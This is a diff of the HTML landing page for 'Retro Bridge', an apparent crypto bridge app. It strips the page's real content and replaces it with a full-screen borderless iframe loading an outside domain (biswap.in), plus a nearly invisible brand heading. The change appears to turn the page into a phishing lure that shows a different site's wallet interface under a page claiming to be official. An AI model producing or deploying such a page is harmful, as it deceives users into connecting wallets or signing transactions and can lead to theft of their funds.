@@ -159,163 +159,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Retro Bridge</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>Non-Custodial DeFi Swap</span>
-      <h1>Retro Bridge</h1>
-      <p class="deck">Retro Bridge is the <a class="cite" href="https://retro-bridge-app.github.io/" rel="nofollow noopener noreferrer">official app page</a> for moving value from <strong>ETH to USDC</strong> with wallet-first control, live route details and no exchange account.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Retro Bridge
+  </h1>
 
-      <section class="routebar" aria-label="Retro Bridge preview">
-        <div class="rhead">
-          <span class="ct">Bridge swap</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You send</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="usdc.png" alt="USDC">USDC <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Route, timing and network cost are shown before you sign.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why use Retro Bridge</span>
-        <h2 class="h2">A direct DeFi route without giving up custody</h2>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Wallet-native from start to finish</h3><p>You connect a <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">Web3 wallet</a>, review the transaction and sign it yourself. Retro Bridge does not require deposits into a centralized account.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Built around real bridge intent</h3><p>Start with <a class="cite" href="https://ethereum.org/en/" rel="nofollow noopener noreferrer">Ethereum</a> assets, choose the receive side and let the app prepare the bridge swap path for the connected network.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Cost and timing visible before approval</h3><p>Bridge swaps depend on liquidity, chain conditions and <a class="cite" href="https://etherscan.io/gastracker" rel="nofollow noopener noreferrer">gas costs</a>, so Retro Bridge keeps the live quote and route review inside the app before confirmation.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Retro Bridge in three steps</h2>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the dashboard and connect the wallet you want to use. You stay in control of keys, approvals and signatures.</p></div>
-        <div class="step"><span class="num">2</span><h3>Select ETH to USDC</h3><p>Choose ETH as the send asset and <a class="cite" href="https://www.circle.com/usdc" rel="nofollow noopener noreferrer">USDC</a> as the receive asset, then let the app calculate the current route.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review and confirm</h3><p>Check the route, expected timing, receive asset and network cost in the app. Confirm only when the wallet prompt matches your intent.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Retro Bridge questions, answered</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is Retro Bridge?</h3><p>Retro Bridge is a non-custodial DeFi app for bridge-style swaps. It helps you move from ETH into USDC while keeping transaction approval in your own wallet.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Which chains and assets does it support?</h3><p>The page preview highlights ETH to USDC. Availability can vary by route, liquidity and network, so check the current list on the <a href="supported-chains/">supported chains</a> page and inside the app.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>How long does a Retro Bridge swap take?</h3><p>Timing depends on source chain confirmation, destination chain activity and route execution. The live estimate is shown in the app before you sign.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>What does Retro Bridge cost?</h3><p>Network fees and route pricing change with market and chain conditions. Retro Bridge shows the live quote, token output and network cost before confirmation.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>Is Retro Bridge custodial?</h3><p>No. Retro Bridge is designed for self-custody: you connect a wallet, review the route and approve the transaction from that wallet.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>How should I check a route?</h3><p>Confirm the token, chain, receiving asset, allowance and wallet prompt. For broader <a class="cite" href="https://defillama.com/" rel="nofollow noopener noreferrer">DeFi market context</a>, compare liquidity and network conditions before sending larger transactions.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Retro Bridge</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Walk through the bridge swap flow from wallet connection to final confirmation.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Understand wallet approvals, self-custody and route review before you sign.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>See the assets and networks available for Retro Bridge routes.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>Retro Bridge</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://retro-bridge-app.github.io/#website","url":"https://retro-bridge-app.github.io/","name":"Retro Bridge"},
-    {"@type":"Organization","@id":"https://retro-bridge-app.github.io/#org","name":"Retro Bridge","url":"https://retro-bridge-app.github.io/","logo":"https://retro-bridge-app.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"Retro Bridge","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://retro-bridge-app.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial DeFi app for bridge-style swaps from a wallet-native interface."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What is Retro Bridge?","acceptedAnswer":{"@type":"Answer","text":"Retro Bridge is a non-custodial DeFi app for bridge-style swaps. It helps you move from ETH into USDC while keeping transaction approval in your own wallet."}},
-      {"@type":"Question","name":"Which chains and assets does it support?","acceptedAnswer":{"@type":"Answer","text":"The page preview highlights ETH to USDC. Availability can vary by route, liquidity and network, so check the current list on the supported chains page and inside the app."}},
-      {"@type":"Question","name":"How long does a Retro Bridge swap take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on source chain confirmation, destination chain activity and route execution. The live estimate is shown in the app before you sign."}},
-      {"@type":"Question","name":"What does Retro Bridge cost?","acceptedAnswer":{"@type":"Answer","text":"Network fees and route pricing change with market and chain conditions. Retro Bridge shows the live quote, token output and network cost before confirmation."}},
-      {"@type":"Question","name":"Is Retro Bridge custodial?","acceptedAnswer":{"@type":"Answer","text":"No. Retro Bridge is designed for self-custody: you connect a wallet, review the route and approve the transaction from that wallet."}},
-      {"@type":"Question","name":"How should I check a route?","acceptedAnswer":{"@type":"Answer","text":"Confirm the token, chain, receiving asset, allowance and wallet prompt. For broader DeFi market context, compare liquidity and network conditions before sending larger transactions."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
